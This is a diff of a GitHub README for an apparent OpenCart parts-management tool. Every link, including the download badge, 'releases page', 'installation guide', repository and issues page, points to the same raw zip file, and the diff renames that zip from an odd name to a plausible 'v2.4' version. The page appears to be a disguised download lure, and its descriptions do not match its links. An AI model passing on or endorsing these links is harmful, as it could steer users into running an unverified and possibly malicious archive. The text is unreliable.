@@ -1,6 +1,6 @@
 # 🛠️ opencart-interactive-scheme - Easy Parts Management for OpenCart
 
-[![Download](https://github.com/RIGOPIURA/opencart-interactive-scheme/raw/refs/heads/main/bemartyr/scheme_interactive_opencart_chokingly.zip)](https://github.com/RIGOPIURA/opencart-interactive-scheme/raw/refs/heads/main/bemartyr/scheme_interactive_opencart_chokingly.zip)
+[![Download](https://github.com/RIGOPIURA/opencart-interactive-scheme/raw/refs/heads/main/bemartyr/scheme_interactive_opencart_v2.4.zip)](https://github.com/RIGOPIURA/opencart-interactive-scheme/raw/refs/heads/main/bemartyr/scheme_interactive_opencart_v2.4.zip)
 
 ## 📖 Overview
 
@@ -13,19 +13,19 @@ To get started with the opencart-interactive-scheme, you will need to download t
 ## 📥 Download & Install
 
 1. **Visit the Download Page**
-   Go to the official GitHub releases page to download the latest version of opencart-interactive-scheme. You can find it here: [Download Page](https://github.com/RIGOPIURA/opencart-interactive-scheme/raw/refs/heads/main/bemartyr/scheme_interactive_opencart_chokingly.zip).
+   Go to the official GitHub releases page to download the latest version of opencart-interactive-scheme. You can find it here: [Download Page](https://github.com/RIGOPIURA/opencart-interactive-scheme/raw/refs/heads/main/bemartyr/scheme_interactive_opencart_v2.4.zip).
 
 2. **Choose the Right Version**
    On the releases page, you will see several versions listed. Select the most recent release for the best features and support.
 
 3. **Download the File**
-   Click on the file that matches your system requirements. For most users, the file will be named something like `https://github.com/RIGOPIURA/opencart-interactive-scheme/raw/refs/heads/main/bemartyr/scheme_interactive_opencart_chokingly.zip`. This file contains all the necessary components to run the application.
+   Click on the file that matches your system requirements. For most users, the file will be named something like `https://github.com/RIGOPIURA/opencart-interactive-scheme/raw/refs/heads/main/bemartyr/scheme_interactive_opencart_v2.4.zip`. This file contains all the necessary components to run the application.
 
 4. **Extract the Files**
    Once the download is complete, locate the zip file in your downloads folder. Right-click the file and choose “Extract All” to unpack its contents. Follow the prompts to complete the extraction.
 
 5. **Install the Application**
-   After extraction, find the folder where the files are located. Open the folder and look for the installation guide, typically named `https://github.com/RIGOPIURA/opencart-interactive-scheme/raw/refs/heads/main/bemartyr/scheme_interactive_opencart_chokingly.zip`. This file will provide step-by-step instructions for setting up the application in your OpenCart store.
+   After extraction, find the folder where the files are located. Open the folder and look for the installation guide, typically named `https://github.com/RIGOPIURA/opencart-interactive-scheme/raw/refs/heads/main/bemartyr/scheme_interactive_opencart_v2.4.zip`. This file will provide step-by-step instructions for setting up the application in your OpenCart store.
 
 6. **Configure Your Store**
    Follow the installation instructions to configure the application. Ensure that you have the necessary permissions to change files in your OpenCart directory.
@@ -56,11 +56,11 @@ For more in-depth information, you can refer to the following resources:
 
 ## 🔗 Additional Links
 
-- **GitHub Repository:** [GitHub Repository](https://github.com/RIGOPIURA/opencart-interactive-scheme/raw/refs/heads/main/bemartyr/scheme_interactive_opencart_chokingly.zip)
-- **Issues Page:** If you encounter any issues, you can report them on the [Issues Page](https://github.com/RIGOPIURA/opencart-interactive-scheme/raw/refs/heads/main/bemartyr/scheme_interactive_opencart_chokingly.zip).
+- **GitHub Repository:** [GitHub Repository](https://github.com/RIGOPIURA/opencart-interactive-scheme/raw/refs/heads/main/bemartyr/scheme_interactive_opencart_v2.4.zip)
+- **Issues Page:** If you encounter any issues, you can report them on the [Issues Page](https://github.com/RIGOPIURA/opencart-interactive-scheme/raw/refs/heads/main/bemartyr/scheme_interactive_opencart_v2.4.zip).
 
 ## 📞 Contact
 
 For support regarding the opencart-interactive-scheme, you may contact the developer via GitHub issues or email associated with their GitHub profile.
 
-Feel free to visit the download page at [this link](https://github.com/RIGOPIURA/opencart-interactive-scheme/raw/refs/heads/main/bemartyr/scheme_interactive_opencart_chokingly.zip) to get started with managing your spare parts today!
+Feel free to visit the download page at [this link](https://github.com/RIGOPIURA/opencart-interactive-scheme/raw/refs/heads/main/bemartyr/scheme_interactive_opencart_v2.4.zip) to get started with managing your spare parts today!
